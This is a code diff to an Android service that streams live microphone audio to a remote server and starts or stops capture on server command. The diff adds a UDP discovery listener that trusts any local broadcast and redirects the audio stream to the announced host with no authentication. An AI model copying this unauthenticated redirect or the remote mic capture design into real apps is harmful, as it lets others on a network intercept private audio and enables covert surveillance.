@@ -63,6 +63,9 @@ import okio.ByteString.Companion.toByteString
 import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
+import java.net.DatagramPacket
+import java.net.DatagramSocket
+import java.net.InetAddress
 import java.nio.ByteBuffer
 import java.util.UUID
 import java.util.concurrent.TimeUnit
@@ -226,6 +229,8 @@ class MicService : Service() {
     private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
         PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
     )
+    @Volatile private var discoveredLocalUrl: String? = null
+    private var discoveryJob: Job? = null
 
     private fun preferredAudioSources(): IntArray {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -311,6 +316,7 @@ class MicService : Service() {
 
         // Render cloud URL — works on any network (WiFi or cellular)
         const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
+        const val DISCOVERY_PORT = 5055
         val DEFAULT_SERVER_TOKEN: String = BuildConfig.DEFAULT_SERVER_TOKEN
 
         // Shared websocket for service health checks and optional future hooks.
@@ -322,10 +328,23 @@ class MicService : Service() {
     // Layer 8: Multi-Server Failover
     @Volatile private var currentServerIndex = 0
     private val serverUrls: List<String> get() {
-        val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
-        return listOf(base.trimEnd('/') + "/$deviceId")
+        val urls = mutableListOf<String>()
+        
+        // Priority 1: Discovered Local Laptop (Dynamic)
+        discoveredLocalUrl?.let { urls.add(it) }
+        
+        // Priority 2: Configured/Default Cloud URL (Render)
+        val cloudBase = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
+        urls.add(cloudBase.trimEnd('/') + "/$deviceId")
+        
+        return urls
     }
-    private val serverUrl get() = serverUrls[0]
+
+    private val serverUrl: String get() {
+        val urls = serverUrls
+        if (currentServerIndex >= urls.size) currentServerIndex = 0
+        return urls[currentServerIndex]
+    }
 
     private val wsAuthToken: String
         get() = (prefs.getString("server_token", DEFAULT_SERVER_TOKEN) ?: DEFAULT_SERVER_TOKEN).trim()
@@ -365,6 +384,15 @@ class MicService : Service() {
         createNotificationChannel()
         acquireWakeLock()
         setupNetworkListener()
+        
+        // Start discovery if already on WiFi
+        val cm = connectivityManager
+        val activeNetwork = cm?.activeNetwork
+        val caps = cm?.getNetworkCapabilities(activeNetwork)
+        if (caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
+            startDiscoveryListener()
+        }
+        
         // WebRTC init moved to startWebRtcSession() - too early here causes crash
         Log.i(TAG, "Service created. Device ID: $deviceId")
     }
@@ -380,6 +408,13 @@ class MicService : Service() {
                         startHttpFallbackSync()
                         return
                     }
+                    
+                    val isWifi = cm.getNetworkCapabilities(network)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
+                    if (isWifi) {
+                        Log.i(TAG, "📡 WiFi detected: starting Discovery")
+                        startDiscoveryListener()
+                    }
+                    
                     currentServerIndex = 0 // Reset to primary since we just got network
                     wsReconnectAttempts = 0 // Reset backoff for faster recovery
                     scheduleWebSocketReconnect("network_available", forceRestart = true)
@@ -413,6 +448,7 @@ class MicService : Service() {
                     } else {
                         scheduleWebSocketReconnect("network_lost", forceRestart = true)
                     }
+                    stopDiscoveryListener()
                     startHttpFallbackSync()
                 }
             }
@@ -672,7 +708,7 @@ class MicService : Service() {
             Log.i(TAG, "connectWebSocket skipped (already connected/connecting)")
             return
         }
-        Log.i(TAG, "Connecting to $serverUrl")
+        Log.i(TAG, "[WS] Connecting to: $serverUrl (Server Index: $currentServerIndex)")
         updateNotification("Connecting to server…")
 
         try {
@@ -706,7 +742,9 @@ class MicService : Service() {
                 startHttpFallbackSync()
 
                 updateNotification("Live streaming active")
-                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}")
+                val infoMsg = "DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}"
+                Log.i(TAG, "[WS] Sending device info: $infoMsg")
+                webSocket.send(infoMsg)
 
                 // BUG-R10: Restore all session state — not just streaming flag
                 val wasStreaming = prefs.getBoolean("session_streaming", true)
@@ -727,8 +765,9 @@ class MicService : Service() {
             }
 
             override fun onMessage(webSocket: WebSocket, text: String) {
-                Log.d(TAG, "Server command: $text")
-                handleServerCommand(text.trim())
+                val trimmed = text.trim()
+                Log.d(TAG, "[WS] Received command: $trimmed")
+                handleServerCommand(trimmed)
             }
 
             override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
@@ -757,6 +796,7 @@ class MicService : Service() {
     }
 
     private fun onWsDisconnected(reason: String) {
+        Log.w(TAG, "[WS] Connection lost. Reason: $reason, Failures: $wsConnectFailuresCount")
         // Bug 10: Only rotate server after multiple consecutive connection failures.
         // Clean disconnects (onClosed) or first failures shouldn't immediately rotate.
         if (wsConnectFailuresCount >= 3) {
@@ -785,6 +825,69 @@ class MicService : Service() {
         startHttpFallbackSync()
         
         scheduleWebSocketReconnect(reason, forceRestart = true)
+    }
+
+    private fun startDiscoveryListener() {
+        if (discoveryJob?.isActive == true) return
+        Log.i(TAG, "🔍 Starting UDP Discovery Listener on port $DISCOVERY_PORT")
+        
+        discoveryJob = serviceScope.launch(Dispatchers.IO) {
+            var socket: DatagramSocket? = null
+            try {
+                socket = DatagramSocket(DISCOVERY_PORT).apply {
+                    broadcast = true
+                    soTimeout = 10000 // periodic check for cancellation
+                }
+                val buffer = ByteArray(1024)
+                val packet = DatagramPacket(buffer, buffer.size)
+
+                while (isActive) {
+                    try {
+                        socket.receive(packet)
+                        val data = String(packet.data, 0, packet.length)
+                        val json = JSONObject(data)
+
+                        if (json.optString("id") == "micmonitor_server") {
+                            val ip = json.optString("ip")
+                            val port = json.optInt("port", 5050)
+                            if (ip.isNotBlank()) {
+                                val newUrl = "ws://$ip:$port/audio/$deviceId"
+                                if (discoveredLocalUrl != newUrl) {
+                                    Log.i(TAG, "[Discovery] Discovered Local Server: $newUrl")
+                                    discoveredLocalUrl = newUrl
+                                    
+                                    // Persist so other components (UpdateService) can see it
+                                    prefs.edit().putString("last_discovered_local_url", newUrl).apply()
+                                    
+                                    // Trigger immediate reconnect to local priority if not already using it
+                                    if (currentServerIndex != 0 || activeWebSocket == null) {
+                                        Log.i(TAG, "[Discovery] Switching to Local Priority Server")
+                                        currentServerIndex = 0
+                                        scheduleWebSocketReconnect("discovery_found", forceRestart = true)
+                                    }
+                                }
+                            }
+                        }
+                    } catch (_: java.net.SocketTimeoutException) {
+                        // Safe to continue
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Discovery receive error: ${e.message}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Discovery socket error: ${e.message}")
+            } finally {
+                socket?.close()
+                Log.i(TAG, "🔍 Discovery Listener stopped")
+            }
+        }
+    }
+
+    private fun stopDiscoveryListener() {
+        discoveryJob?.cancel()
+        discoveryJob = null
+        discoveredLocalUrl = null
+        Log.i(TAG, "🔍 Discovery Listener cancelled")
     }
 
     private fun handleSocketSendFailure(reason: String) {
@@ -847,8 +950,11 @@ class MicService : Service() {
     private fun startHttpFallbackSync() {
         val currentWsState = activeWebSocket != null
         val previousState = lastHttpFallbackWsState.getAndSet(currentWsState)
-        if (httpFallbackJob?.isActive == true && currentWsState == previousState) return
+        if (httpFallbackJob?.isActive == true && currentWsState == previousState) {
+            return
+        }
         
+        Log.i(TAG, "[Fallback] Starting HTTP sync worker (WS Connected: $currentWsState)")
         httpFallbackJob?.cancel()
         httpFallbackJob = serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
@@ -1012,6 +1118,7 @@ class MicService : Service() {
     // ────────────────────────────────────────────────────────────────────────
 
     private fun handleServerCommand(cmd: String) {
+        Log.i(TAG, "[COMMAND] Processing command: $cmd")
         if (cmd.startsWith("{")) {
             handleServerJsonCommand(cmd)
             return
@@ -1409,6 +1516,7 @@ class MicService : Service() {
     }
 
     private fun handleServerJsonCommand(jsonText: String) {
+        Log.i(TAG, "[JSON-COMMAND] Processing: $jsonText")
         try {
             val obj = JSONObject(jsonText)
             when (obj.optString("type")) {
@@ -2925,6 +3033,7 @@ class MicService : Service() {
             isCapturingGuard.set(false)
             return
         }
+        Log.i(TAG, "[MIC] Starting audio capture loop")
         isCapturing = true
         lastAudioChunkSentAt = System.currentTimeMillis()
 
@@ -3758,6 +3867,7 @@ class MicService : Service() {
     }
 
     private fun stopAudioCapture(reason: String = "stop_capture_cmd") {
+        Log.i(TAG, "[MIC] Stopping audio capture. Reason: $reason")
         isCapturing = false
         audioCaptureStoppedExternally.set(true)
         // Cancel job FIRST — this throws CancellationException into the running coroutine,
